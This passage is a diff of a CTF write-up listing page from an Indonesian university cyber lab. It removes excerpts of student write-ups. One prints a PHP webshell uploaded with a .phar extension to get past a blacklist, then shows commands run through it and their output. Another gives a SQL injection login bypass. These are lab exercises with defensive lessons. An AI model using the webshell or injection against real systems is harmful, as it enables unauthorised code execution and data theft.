@@ -53,13 +53,13 @@
 <meta property="og:title" content="Write Up">
 <meta property="og:site_title" content="0xUCL">
 <meta property="og:description" content="Unsri Cyber Lab. Portal komunitas cyber security untuk dokumentasi write-up CTF, pembelajaran exploit, dan arsip penyelesaian soal.">
-<meta property="og:url" content="http://zeroxucl.team">
+<meta property="og:url" content="https://zeroxucl.team">
 <meta property="og:image" content="/images/share.jpg">
 <meta property="og:locale" content="en_US">
 
 <meta property="twitter:title" content="Write Up">
 <meta property="twitter:description" content="Unsri Cyber Lab. Portal komunitas cyber security untuk dokumentasi write-up CTF, pembelajaran exploit, dan arsip penyelesaian soal.">
-<meta property="twitter:url" content="http://zeroxucl.team">
+<meta property="twitter:url" content="https://zeroxucl.team">
 <meta property="twitter:card" content="summary_large_image">
 <meta property="twitter:image" content="/images/share.jpg">
 
@@ -80,11 +80,11 @@
       "@type": "Organization",
       "logo": { "@type": "ImageObject", "url": "/images/icon.png" }
     },
-    "url": "http://zeroxucl.team"
+    "url": "https://zeroxucl.team"
   }
 </script>
 
-<link rel="alternate" type="application/rss+xml" href="http://zeroxucl.team/feed.xml">
+<link rel="alternate" type="application/rss+xml" href="https://zeroxucl.team/feed.xml">
 
   <!-- Google Fonts -->
 <!-- automatically get url from fonts used in theme file -->
@@ -558,1273 +558,6 @@ Gunakan search atau tag untuk mencari kategori tertentu.</p>
     
 
     
-    <a href="/2026/06/10/upload-dokumen.html" class="post-excerpt-image" aria-label="W1-C3 Upload Dokumen">
-      <img src="/images/oxucl-logo.jpg" alt="W1-C3 Upload Dokumen" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-    </a>
-    
-
-    <div class="post-excerpt-text">
-      <a href="/2026/06/10/upload-dokumen.html">W1-C3 Upload Dokumen</a>
-
-      <div class="post-info">
-  
-    
-    
-      
-      
-        
-
-
-
-<div class="portrait-wrapper">
-  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
-    
-
-    <img src="/images/logo.jpg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-
-    
-      <span class="portrait-name">
-        Azizul Manal Gaumalanga
-      </span>
-    
-
-    
-
-    
-      <span class="portrait-affiliation">
-        Teknik Informatika (2024)
-      </span>
-    
-  </a>
-</div>
-
-      
-    
-  
-
-  
-  
-
-  
-    <span data-tooltip="Originally published on">
-      <i class="icon fa-regular fa-calendar"></i>
-      <span>June 10, 2026</span>
-    </span>
-  
-
-  
-</div>
-
-
-  
-
-
-  <div class="tags">
-    
-      <a href="/writeups?search=%22tag:%20web%22" class="tag" data-tooltip='Show items with the tag "web"'>
-        web
-      </a>
-    
-      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
-        zero-day-2026
-      </a>
-    
-  </div>
-
-
-
-
-
-      
-      
-      
-      
-      <p data-search="Detail Soal Field Value Nama Challenge W1-C3: Upload Dokumen Kategori Web Breach Event ZERO DAY Mini Games 2026 Deskripsi SingkatChallenge W1-C3: Upload Dokumen merupakan challenge Web Breach yang membahas celah pada fitur upload file. Website menyediakan portal upload dokumen internal milik PT Infranet Solusi. Berdasarkan narasi dan catatan challenge, fokus utama penyelesaian adalah mencari kelemahan pada kebijakan validasi file upload.Analisis AwalSaat pertama kali membuka website, ditemukan halaman login pegawai. Setelah melihat source code halaman, terdapat komentar HTML yang berisi kredensial login. lt; -- Akses portal pegawai: pegawai BerkasUji2026 -- gt;Dari komentar tersebut, saya mendapatkan username dan password berikut.Username: pegawaiPassword: BerkasUji2026Setelah berhasil login, saya diarahkan ke halaman Sistem Upload Dokumen Internal. Pada halaman tersebut terdapat fitur upload file dengan keterangan bahwa sistem menerima file dokumen standar seperti PDF, DOCX, XLS, TXT, CSV, JPG, dan PNG.Sistem ini menerima dokumen kerja standar: PDF, DOCX, XLS, TXT, CSV, JPG, dan PNG.Catatan challenge juga memberikan petunjuk berikut. Daftar larangan yang tidak lengkap sama bahayanya dengan tidak ada daftar larangan sama sekali. Petunjuk tersebut mengarah pada kemungkinan bahwa sistem menggunakan blacklist extension. Jika daftar ekstensi yang diblokir tidak lengkap, maka ekstensi lain yang masih dapat diproses sebagai PHP bisa digunakan untuk bypass upload.Langkah PenyelesaianLangkah pertama adalah login menggunakan kredensial yang ditemukan pada komentar HTML.pegawai BerkasUji2026Setelah masuk ke halaman upload, saya membuat file webshell PHP sederhana dengan nama:a.pharIsi payload yang digunakan adalah sebagai berikut. lt; phpecho OK lt;br gt; ;if isset GET cmd echo lt;pre gt; ; system GET cmd ; echo lt; pre gt; ; gt;Ekstensi .phar digunakan karena pada beberapa konfigurasi server PHP, file dengan ekstensi tersebut masih dapat dieksekusi sebagai script PHP. Selain itu, ekstensi .phar tidak termasuk dalam daftar ekstensi yang diblokir oleh sistem, sehingga file berhasil diunggah.Setelah upload berhasil, file dapat diakses melalui direktori upload. uploads a.pharSaat file dibuka, halaman menampilkan output:OKHal ini menunjukkan bahwa file berhasil diakses dan script PHP di dalamnya berjalan.Selanjutnya, saya menguji eksekusi command menggunakan parameter cmd. uploads a.phar cmd idHasilnya menunjukkan bahwa command berhasil dijalankan oleh server.uid 33 www-data gid 33 www-data groups 33 www-data Output tersebut membuktikan bahwa celah upload berhasil dimanfaatkan menjadi Remote Code Execution dengan user www-data.Setelah itu, saya melakukan enumerasi direktori root menggunakan command berikut. uploads a.phar cmd ls -la Dari hasil listing, ditemukan bahwa server berjalan di dalam container dan terdapat direktori var www.Kemudian saya mengecek isi direktori var www. uploads a.phar cmd ls -la var wwwHasilnya menunjukkan adanya dua direktori penting.htmlprivateDirektori html digunakan sebagai webroot, sedangkan direktori private mencurigakan karena berada di luar webroot dan biasanya digunakan untuk menyimpan file sensitif.Saya kemudian mengecek isi direktori var www private. uploads a.phar cmd ls -la var www private 2 gt; amp;1Hasilnya ditemukan file flag.-rw-r----- 1 root www-data 29 Jun 2 04:17 flag.txtPermission file tersebut menunjukkan bahwa file dimiliki oleh user root, tetapi group-nya adalah www-data. Karena webshell berjalan sebagai www-data, file tersebut tetap dapat dibaca.Langkah terakhir adalah membaca isi file flag. uploads a.phar cmd cat var www private flag.txtDari command tersebut, flag berhasil didapatkan.Flagflag ph4r upl04d byp4ss rce Kesimpulan Hal yang DipelajariChallenge ini menunjukkan bahwa validasi upload file menggunakan blacklist tidak aman jika daftar ekstensi yang diblokir tidak lengkap. Meskipun ekstensi umum seperti .php atau .phtml dapat diblokir, ekstensi lain seperti .phar masih dapat dimanfaatkan apabila server tetap mengeksekusinya sebagai script PHP.Dari challenge ini, saya belajar bahwa fitur upload file harus divalidasi menggunakan whitelist yang ketat, bukan hanya blacklist. Selain itu, server juga sebaiknya tidak mengizinkan eksekusi script di direktori upload, melakukan pengecekan MIME type dan isi file, mengganti nama file saat disimpan, serta menyimpan file upload di lokasi yang aman.">
-        Challenge W1-C3: Upload Dokumen merupakan challenge Web Breach yang membahas celah pada fitur upload file. Website menyediakan portal upload dokumen internal milik PT Infranet Solusi. Berdasarkan narasi dan catatan challenge, fokus utama penyelesaian adalah mencari kelemahan pada kebijakan validasi file...
-      </p>
-    </div>
-  </div>
-</div>
-
-<div class="post-excerpt-container">
-  <div class="post-excerpt">
-    
-    
-    
-
-    
-    <a href="/2026/06/10/profil-terbuka.html" class="post-excerpt-image" aria-label="W1-B2 Profil Terbuka">
-      <img src="/images/oxucl-logo.jpg" alt="W1-B2 Profil Terbuka" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-    </a>
-    
-
-    <div class="post-excerpt-text">
-      <a href="/2026/06/10/profil-terbuka.html">W1-B2 Profil Terbuka</a>
-
-      <div class="post-info">
-  
-    
-    
-      
-      
-        
-
-
-
-<div class="portrait-wrapper">
-  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
-    
-
-    <img src="/images/logo.jpg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-
-    
-      <span class="portrait-name">
-        Azizul Manal Gaumalanga
-      </span>
-    
-
-    
-
-    
-      <span class="portrait-affiliation">
-        Teknik Informatika (2024)
-      </span>
-    
-  </a>
-</div>
-
-      
-    
-  
-
-  
-  
-
-  
-    <span data-tooltip="Originally published on">
-      <i class="icon fa-regular fa-calendar"></i>
-      <span>June 10, 2026</span>
-    </span>
-  
-
-  
-</div>
-
-
-  
-
-
-  <div class="tags">
-    
-      <a href="/writeups?search=%22tag:%20osint%22" class="tag" data-tooltip='Show items with the tag "osint"'>
-        osint
-      </a>
-    
-      <a href="/writeups?search=%22tag:%20recon%22" class="tag" data-tooltip='Show items with the tag "recon"'>
-        recon
-      </a>
-    
-      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
-        zero-day-2026
-      </a>
-    
-  </div>
-
-
-
-
-
-      
-      
-      
-      
-      <p data-search="Detail Soal Field Value Nama Challenge Profil Terbuka Kategori Recon OSINT Event ZERO DAY Scholar Battle Poin 100 Difficulty Easy File - Deskripsi SingkatChallenge W1-B2: Profil Terbuka merupakan soal kategori Recon OSINT. Pada challenge ini, peserta diminta menelusuri profil publik Sari Dewi, seorang IT Security Analyst yang dikenal dengan julukan berkaitan dengan cermin . Informasi sensitif disembunyikan di beberapa bagian profilnya dalam bentuk yang tidak langsung terbaca. Peserta perlu mengikuti jejak yang tersedia, melakukan proses decoding, lalu mengubah hasil flag ke format huruf kecil flag ... sebelum disubmit.Analisis AwalPada tahap awal, saya membuka halaman utama Direktori Profil Publik Sari Dewi. Di halaman tersebut terdapat beberapa tautan yang mengarah ke arsip profil publik, yaitu Twitter Archive dan LinkedIn Export. Karena challenge ini termasuk kategori Recon OSINT, saya mulai menelusuri setiap informasi yang tersedia pada halaman tersebut.Dari halaman Twitter Archive, ditemukan sebuah petunjuk bahwa Sari Dewi memiliki blog lama dengan nama file sari blog.html. Selain itu, terdapat tweet yang menyebutkan bahwa ia menyukai kode cermin dan sebuah cipher klasik yang memiliki sifat encode dan decode dengan cara yang sama. Petunjuk ini penting karena istilah cermin mengarah pada konsep pertukaran huruf secara berlawanan dalam alfabet.Cipher klasik yang sesuai dengan petunjuk tersebut adalah Atbash Cipher. Pada Atbash, huruf alfabet dicerminkan dari depan ke belakang, misalnya A menjadi Z, B menjadi Y, C menjadi X, dan seterusnya. Karena prosesnya hanya mencerminkan huruf, metode yang sama dapat digunakan untuk encode maupun decode.Saya kemudian membuka halaman sari blog.html. Pada halaman blog tersebut terdapat bagian Catatan Rahasia yang mengarahkan pengguna untuk membaca halaman about me.html. Setelah membuka halaman tersebut, ditemukan informasi yang semakin memperkuat dugaan sebelumnya, yaitu Sari Dewi memiliki alias Cermin Dunia dan secara langsung menyebut bahwa ia menyukai Atbash.Pada halaman about me.html, ditemukan pesan rahasia berikut:UOZT 4GY4HS X3IN1M W3X0W3W Berdasarkan petunjuk kode cermin , sifat encode dan decode yang sama, serta penyebutan Atbash pada halaman profil, dapat disimpulkan bahwa pesan tersebut perlu didekode menggunakan Atbash Cipher.Langkah PenyelesaianLangkah pertama adalah membuka halaman utama challenge dan membaca seluruh tautan yang tersedia. Dari halaman utama ditemukan dua sumber informasi, yaitu twitter archive.html dan linkedin export.txt.Selanjutnya, saya membuka twitter archive.html dan menemukan petunjuk bahwa blog lama Sari Dewi berada pada halaman:sari blog.htmlPada arsip Twitter juga terdapat petunjuk mengenai kode cermin , yang mengarah ke cipher klasik dengan proses encode dan decode yang sama.Setelah itu, saya membuka halaman sari blog.html. Di dalam source dan isi halaman blog, terdapat petunjuk menuju halaman lain, yaitu:about me.htmlKemudian saya membuka halaman about me.html dan menemukan pesan rahasia berikut:UOZT 4GY4HS X3IN1M W3X0W3W Karena halaman tersebut secara eksplisit menyebut Atbash, maka pesan tersebut didekode menggunakan Atbash Cipher. Proses decoding menghasilkan:FLAG 4TB4SH C3RM1N D3C0D3D Setelah hasil decode didapatkan, isi flag masih menggunakan bentuk leetspeak. Angka pada teks tersebut dapat dibaca sebagai huruf: Angka Huruf 4 A 3 E 1 I 0 O Sehingga isi flag menjadi:ATBASH CERMIN DECODEDKarena format submit challenge menggunakan huruf kecil, maka flag akhir ditulis dalam lowercase.Flagflag atbash cermin decoded Kesimpulan Hal yang DipelajariDari challenge ini, saya belajar bahwa pada soal Recon OSINT, informasi penting tidak selalu langsung terlihat di halaman utama. Peserta perlu mengikuti setiap jejak digital yang tersedia, seperti arsip Twitter, export LinkedIn, blog, komentar HTML, dan halaman tersembunyi.Selain itu, challenge ini juga menunjukkan bahwa petunjuk narasi seperti cermin dapat mengarah pada teknik kriptografi tertentu, yaitu Atbash Cipher. Dengan memahami konteks dan menghubungkan setiap petunjuk, pesan rahasia dapat didekode hingga menghasilkan flag yang benar.">
-        Challenge W1-B2: Profil Terbuka merupakan soal kategori Recon / OSINT. Pada challenge ini, peserta diminta menelusuri profil publik Sari Dewi, seorang IT Security Analyst yang dikenal dengan julukan berkaitan dengan “cermin”. Informasi sensitif disembunyikan di beberapa bagian profilnya dalam bentuk...
-      </p>
-    </div>
-  </div>
-</div>
-
-<div class="post-excerpt-container">
-  <div class="post-excerpt">
-    
-    
-    
-
-    
-    <a href="/2026/06/10/portal-pemantauan-server.html" class="post-excerpt-image" aria-label="W1-C1 Portal Pemantauan Server">
-      <img src="/images/oxucl-logo.jpg" alt="W1-C1 Portal Pemantauan Server" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-    </a>
-    
-
-    <div class="post-excerpt-text">
-      <a href="/2026/06/10/portal-pemantauan-server.html">W1-C1 Portal Pemantauan Server</a>
-
-      <div class="post-info">
-  
-    
-    
-      
-      
-        
-
-
-
-<div class="portrait-wrapper">
-  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
-    
-
-    <img src="/images/logo.jpg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-
-    
-      <span class="portrait-name">
-        Azizul Manal Gaumalanga
-      </span>
-    
-
-    
-
-    
-      <span class="portrait-affiliation">
-        Teknik Informatika (2024)
-      </span>
-    
-  </a>
-</div>
-
-      
-    
-  
-
-  
-  
-
-  
-    <span data-tooltip="Originally published on">
-      <i class="icon fa-regular fa-calendar"></i>
-      <span>June 10, 2026</span>
-    </span>
-  
-
-  
-</div>
-
-
-  
-
-
-  <div class="tags">
-    
-      <a href="/writeups?search=%22tag:%20web%22" class="tag" data-tooltip='Show items with the tag "web"'>
-        web
-      </a>
-    
-      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
-        zero-day-2026
-      </a>
-    
-  </div>
-
-
-
-
-
-      
-      
-      
-      
-      <p data-search="Detail Soal Field Value Nama Challenge Portal Pemantauan Server Kategori Web Breach Event ZERO DAY Scholar Battle Poin 100 Difficulty Easy File - Deskripsi SingkatChallenge W1-C1: Portal Pemantauan Server merupakan challenge kategori Web Breach. Pada challenge ini diberikan sebuah portal pemantauan server milik PT Infranet Solusi. Panel administrasi portal tersebut menyimpan token keamanan rahasia yang hanya dapat diakses oleh administrator.Tujuan dari challenge ini adalah mendapatkan akses ke panel admin dan mengambil token atau flag yang tersimpan di dalamnya.Analisis AwalLangkah pertama yang saya lakukan adalah membuka halaman utama portal. Pada halaman tersebut terdapat beberapa informasi status server dan menu Lupa Password. Setelah memeriksa source code halaman awal, ditemukan komentar HTML yang menunjukkan lokasi halaman login administrator. lt; -- auth login.php -- gt;Dari informasi tersebut, saya membuka halaman auth login.php. Halaman ini memiliki form login dengan input username dan password. Berdasarkan catatan challenge yang berbunyi: Akses yang tidak sah seringkali bukan soal kata sandi yang lemah, melainkan logika yang cacat. Saya menyimpulkan bahwa celah kemungkinan berada pada proses autentikasi, bukan pada brute force password. Karena halaman login menerima input username dan password, saya mencoba menguji kemungkinan adanya SQL Injection pada form login.Langkah PenyelesaianPada halaman login administrator, saya mencoba memasukkan payload SQL Injection sederhana pada field username.Payload yang digunakan:admin --Kemudian field password dapat diisi dengan nilai bebas, karena bagian pengecekan password akan dikomentari oleh payload SQL Injection tersebut.Contoh input:Username: admin --Password: bebasJika query login di backend dibuat secara tidak aman, kemungkinan bentuk query-nya seperti berikut:SELECT FROM users WHERE username admin AND password ... ;Setelah payload dimasukkan, query dapat berubah menjadi:SELECT FROM users WHERE username admin -- AND password ... ;Tanda -- membuat bagian setelahnya dianggap sebagai komentar, sehingga pengecekan password tidak lagi diproses. Dengan begitu, login berhasil dilakukan sebagai user admin.Setelah berhasil masuk, halaman panel admin menampilkan informasi sesi sebagai administrator dan menampilkan token keamanan sistem. Pada bagian Token Keamanan Sistem, ditemukan flag challenge.Flagflag sql1 byp4ss 4dm1n p4n3l Kesimpulan Hal yang DipelajariDari challenge ini, saya mempelajari bahwa celah keamanan pada proses login tidak selalu berasal dari password yang lemah, tetapi bisa berasal dari validasi input dan query database yang tidak aman. SQL Injection dapat terjadi ketika input pengguna langsung digabungkan ke dalam query SQL tanpa proses sanitasi atau penggunaan prepared statement.Challenge ini juga menunjukkan pentingnya memeriksa source code halaman, karena komentar HTML pada halaman awal memberikan petunjuk menuju halaman login administrator. Selain itu, penggunaan query SQL yang aman sangat penting agar autentikasi tidak dapat dilewati hanya dengan memanipulasi input login.">
-        Challenge W1-C1: Portal Pemantauan Server merupakan challenge kategori Web Breach. Pada challenge ini diberikan sebuah portal pemantauan server milik PT Infranet Solusi. Panel administrasi portal tersebut menyimpan token keamanan rahasia yang hanya dapat diakses oleh administrator. Tujuan dari challenge ini...
-      </p>
-    </div>
-  </div>
-</div>
-
-<div class="post-excerpt-container">
-  <div class="post-excerpt">
-    
-    
-    
-
-    
-    <a href="/2026/06/10/pesan-tersembunyi.html" class="post-excerpt-image" aria-label="W1-A1 Pesan Tersembunyi">
-      <img src="/images/oxucl-logo.jpg" alt="W1-A1 Pesan Tersembunyi" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-    </a>
-    
-
-    <div class="post-excerpt-text">
-      <a href="/2026/06/10/pesan-tersembunyi.html">W1-A1 Pesan Tersembunyi</a>
-
-      <div class="post-info">
-  
-    
-    
-      
-      
-        
-
-
-
-<div class="portrait-wrapper">
-  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
-    
-
-    <img src="/images/logo.jpg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-
-    
-      <span class="portrait-name">
-        Azizul Manal Gaumalanga
-      </span>
-    
-
-    
-
-    
-      <span class="portrait-affiliation">
-        Teknik Informatika (2024)
-      </span>
-    
-  </a>
-</div>
-
-      
-    
-  
-
-  
-  
-
-  
-    <span data-tooltip="Originally published on">
-      <i class="icon fa-regular fa-calendar"></i>
-      <span>June 10, 2026</span>
-    </span>
-  
-
-  
-</div>
-
-
-  
-
-
-  <div class="tags">
-    
-      <a href="/writeups?search=%22tag:%20crypto%22" class="tag" data-tooltip='Show items with the tag "crypto"'>
-        crypto
-      </a>
-    
-      <a href="/writeups?search=%22tag:%20puzzle%22" class="tag" data-tooltip='Show items with the tag "puzzle"'>
-        puzzle
-      </a>
-    
-      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
-        zero-day-2026
-      </a>
-    
-  </div>
-
-
-
-
-
-      
-      
-      
-      
-      <p data-search="Detail Soal Field Value Nama Challenge W1-A1 Pesan Tersembunyi Kategori Crypto amp; Puzzle Event ZERO DAY Mini Games 2026 Poin 100 Difficulty Easy File ANALYST NOTE.txt ENCODE MEMO.txt SERVER LOG.txt Deskripsi SingkatChallange ini termasuk ke dalam kategori crypto dan puzzle, berdasarkan instruksi yang diberikan, peserta diminta untuk membuka file yang disediakan dan membaca isinya. Catatan pada soal memberikan petunjuk bahwa data mengandung pola. Data yang tampak acak selalu menyimpan pola - tugas analis adalah menemukannya. Analisis AwalPada challenge ini terdapat tiga file yang diberikan, yaitu ANALYST NOTE.txt, ENCODE MEMO.txt, dan SERVER LOG.txt.Langkah pertama yang saya lakukan adalah membaca dan menganalisis masing-masing file untuk mencari petunjuk awal, hal ini sesuai dengan catatan pada challenge.File ANALYST NOTE.txt berfungsi sebagai petunjuk utama. Dari catatan tersebut, saya memahami bahwa data yang dicari telah disamarkan dengan menggunakan dua lapisan encoding, dan target utama pemeriksaan adalah file ENCODE MEMO.txt.File ENCODE MEMO.txt berisi:WlJaQiBWQUdSRUFOWSDigJQgRU5VTkZWTgpYcmNucW4gIDogR3Z6IFpuYW53cnpyYSBDRyBBaGZuYWduZW4gUXZ0dmdueQpRbmV2ICAgIDogUXJjbmVncnpyYSBYcm56bmFuYSBWYXNiZXpuZnYKQ3JldnVueSA6IFZhZnZxcmEgWHJvYnBiZW5hIFFuZ24g4oCUIEd2YXFueCBZbmF3aGcgRnJ0cmVuCgpDbnFuIGduYXR0bnkgMTUgWnJ2IDIwMjYsIGZ2ZmdyeiB4bnp2IHpyYXFyZ3J4ZnYgbnhndml2Z25mIGd2cW54IGZudSBsbmF0CnpyYXRueHZvbmd4bmEgeHJvYnBiZW5hIHFuZ24gcW5ldiBmcmVpcmUgY2VicWh4ZnYuIENyeW54aCBxdnFodG4genJhdHRoYW54bmEKbnluZyBiZ2J6bmd2ZiBoYWdoeCB6cmF0cnhmZ2VueCBxbmduIHhiYXN2dGhlbmZ2IGZyYWZ2Z3ZzIHFuZXYgcXZlcnhnYmV2IGxuYXQKZnJ1bmVoZmFsbiBxdm9uZ25mdiBueGZyZmFsbi4KCk9yZXFuZm5leG5hIG5hbnl2ZnZmIHlidCBuam55LCBxdmdyemh4bmEgb251am4gZnJ3aHp5bnUgc3Z5ciB4YmFzdnRoZW5mdiBncnludQpxdnJ4ZnN2eWdlbmZ2LiBDcnlueGggcXZjcmV4dmVueG5hIGdyeW51IHpyYWxuem5leG5hIHFuZ24gZ3JlZnJvaGcgenJhdHRoYW54bmEKZ3J4YXZ4IHJhcGJxdmF0IGZyb3J5aHogenJhdHZldnp4bmFhbG4geHIgZnJlaXJlIHJ4ZmdyZWFueS4gVmFpcmZndnRuZnYgeXJvdnUKeW5hd2hnIHpuZnZ1IG9yZXluYXRmaGF0IG9yZWZuem4gZ3Z6IFBGVkVHLgoKWGJxciBxbmVoZW5nIGxuYXQgcXZncmduY3huYTogc3ludHtxMGhveTNfeTRsM2VfejN6MF9xM3AwcTNxfS4gWGJxciB2YXYgdW5hbG4gcXZjcmVoYWdoeHhuYSBvbnR2Cmd2eiB2YWZ2cXJhIHFuYSB1bmVoZiBxdndudG4geHJlbnVuZnZubmFhbG4uIFduYXRuYSBxdmZyb25leG5hIHpyeW55aHYgeG5hbnkKeGJ6aGF2eG5mdiBsbmF0IGd2cW54IG56bmEgZ25hY24gcmF4ZXZjZnYgcmFxLWdiLXJhcS4KCkZydHJlbiB5bmNiZXhuYSBncnpobmEgZ256b251bmEgeHJjbnFuIHhiYmVxdmFuZ2JlIHZhZnZxcmEuIEVuY25nIGZ2Z2huZnYgbnhuYQpxdmZyeXJhdHRuZW54bmEgY25xbiBjaHhoeSAxNC4wMCBKVk8gdW5ldiB2YXYuIFhydW5xdmVuYSBmcnloZWh1IG5hdHRiZ24gZ3Z6Cmpud3ZvIGhhZ2h4IHpyem9udW5mIHluYXR4bnUgenZndnRuZnYgcW5hIGVyZmNiYWYgdmFmdnFyYSB5cm92dSB5bmF3aGcuCgpVYmV6bmcgeG56diwKUXZpdmZ2IFhybnpuYW5hIEZ2b3JlCkNHIEFoZm5hZ25lbiBRdnR2Z255Cg String ini diakhiri dengan karakter yang merupakan padding khas dari encoding base64. Hal ini menjadi petunjuk kuat bahwa lapisan pertama encoding adalah base64.Hasil decode-nya adalah:ZRZB VAGREANY ENUNFVNXrcnqn : GvzАнанwrzra CG Ahfnagnen QvtvgnyQnev : Qrcnegrzra Xrnznana VasbeznfvCrevuny : Vafvqra Xrobpbena Qngn Gvaqnx Ynawhg Frtren...Output decode menunjukan teks masih tidak terbaca. Pola ini mengindikasikan encoding ROT13 yang dapat diidentifikasi dari dua ciri: Kata-kata pendek seperti gvz kemungkinan besar tim pergeseran 13 huruf Struktur kalimat masih terlihat spasi, tanda baca utuh , menandakan ini encoding substitusi, bukan enkripsi acakFile SERVER LOG.txt berisi log aktivitas server. Setelah diperiksa, file ini tidak mengandung data relevan untuk menemukan flag dan berfungsi sebagai red herring elemen pengecoh yang umum ditemukan dalam challenge CTF.Berdasarkan seluruh hasil analisis, flag bisa didapatkan dengan mendecode isi dari ENCODE MEMO.txt dengan Base64 kemudian ROT13.Langkah PenyelesaianTool yang digunakan adalah CyberChef. Tool ini dipilih karena kemampuannya melakukan operasi decode secara bersamaan, tanpa menulis skrip. Paste seluruh isi dari file ENCODE MEMO.txt ke kolom input Pada kolom recipe, tambahkan dua operasi berurutan: Pertama: From Base64 Kedua: ROT13 Output final akan muncul otomatis di kolom outputMEMO INTERNAL RAHASIAKepada : Tim Manajemen PT Nusantara DigitalDari : Departemen Keamanan InformasiPerihal : Insiden Kebocoran Data Tindak Lanjut SegeraPada tanggal 15 Mei 2026, sistem kami mendeteksi aktivitas tidak sah yangmengakibatkan kebocoran data dari server produksi. Pelaku diduga menggunakanalat otomatis untuk mengekstrak data konfigurasi sensitif dari direktori yangseharusnya dibatasi aksesnya....Kode darurat yang ditetapkan: flag d0ubl3 l4y3r m3m0 d3c0d3d . Kode ini hanya diperuntukkan bagitim insiden dan harus dijaga kerahasiaannya.Flag ditemukan di paragraf 3, tertulis sebagai kode darurat.Flagflag d0ubl3 l4y3r m3m0 d3c0d3d Kesimpulan Hal yang DipelajariSaya mempelajari banyak hal dari tantangan ini. Saya belajar tentang encoding paling umum di CTF yaitu Base64 dan ROT13. Kedua encoding ini ternyata mudah dikenali secara visual tanpa bantuan tool: Base64 bisa dikenali dengan padding atau di akhir string, sedangkan ROT13 bisa dikenali dengan masih terjaganya struktur kalimat.">
-        Challange ini termasuk ke dalam kategori crypto dan puzzle, berdasarkan instruksi yang diberikan, peserta diminta untuk membuka file yang disediakan dan membaca isinya. Catatan pada soal memberikan petunjuk bahwa data mengandung pola. "Data yang tampak acak selalu menyimpan pola -...
-      </p>
-    </div>
-  </div>
-</div>
-
-<div class="post-excerpt-container">
-  <div class="post-excerpt">
-    
-    
-    
-
-    
-    <a href="/2026/06/10/perusahaan-bayangan.html" class="post-excerpt-image" aria-label="W1-B3 Perusahaan Bayangan">
-      <img src="/images/oxucl-logo.jpg" alt="W1-B3 Perusahaan Bayangan" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-    </a>
-    
-
-    <div class="post-excerpt-text">
-      <a href="/2026/06/10/perusahaan-bayangan.html">W1-B3 Perusahaan Bayangan</a>
-
-      <div class="post-info">
-  
-    
-    
-      
-      
-        
-
-
-
-<div class="portrait-wrapper">
-  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
-    
-
-    <img src="/images/logo.jpg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
-
-    
-      <span class="portrait-name">
-        Azizul Manal Gaumalanga
-      </span>
-    
-
-    
-
-    
-      <span class="portrait-affiliation">
-        Teknik Informatika (2024)
-      </span>
-    
-  </a>
-</div>
-
-      
-    
-  
-
-  
-  
-
-  
-    <span data-tooltip="Originally published on">
-      <i class="icon fa-regular fa-calendar"></i>
-      <span>June 10, 2026</span>
-    </span>
-  
-
-  
-</div>
-
-
-  
-
-
-  <div class="tags">
-    
-      <a href="/writeups?search=%22tag:%20osint%22" class="tag" data-tooltip='Show items with the tag "osint"'>
-        osint
-      </a>
-    
-      <a href="/writeups?search=%22tag:%20recon%22" class="tag" data-tooltip='Show items with the tag "recon"'>
-        recon
-      </a>
-    
-      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
-        zero-day-2026
-      </a>
-    
-  </div>
-
-
-
-
-
-      
-      
-      
-      
-      <p data-search="Detail Soal Field Value - - Detail Soal Nama Challenge W1-B3: Perusahaan Bayangan Kategori Recon OSINT Poin 200 Event ZERO DAY Mini Games 2026 Deskripsi SingkatPada challenge ini, diberikan sebuah website milik PT Siluman Teknologi. Berdasarkan narasi soal, data sensitif perusahaan diduga bocor dan tersebar di beberapa lokasi digital. Tujuan dari challenge ini adalah menelusuri jejak-jejak yang tersedia pada website untuk menemukan komponen yang diperlukan dalam proses mendapatkan flag.Analisis AwalLangkah pertama dilakukan dengan membuka halaman utama PT Siluman Teknologi. Pada halaman tersebut terdapat daftar tim teknis unggulan dan sebuah tautan untuk mengunduh direktori karyawan dalam bentuk file employee list.csv.Dari file CSV tersebut ditemukan beberapa data karyawan seperti nama, divisi, email, status, dan blog pribadi. Salah satu entri yang menarik adalah Ahmad Fauzi, seorang Senior Security Engineer dengan ID karyawan EMP-3391, yang memiliki blog pribadi bernama aftech.html.Selain itu, pengecekan terhadap robots.txt juga memberikan petunjuk penting karena terdapat beberapa path yang tidak diperbolehkan untuk diindeks, salah satunya adalah leaked env.txt. File ini menjadi petunjuk kuat karena halaman utama juga menyebutkan adanya potensi kebocoran file konfigurasi.Langkah PenyelesaianPertama, saya membuka file employee list.csv dari halaman utama. File tersebut berisi data karyawan PT Siluman Teknologi. Dari file ini ditemukan bahwa Ahmad Fauzi memiliki blog pribadi dengan 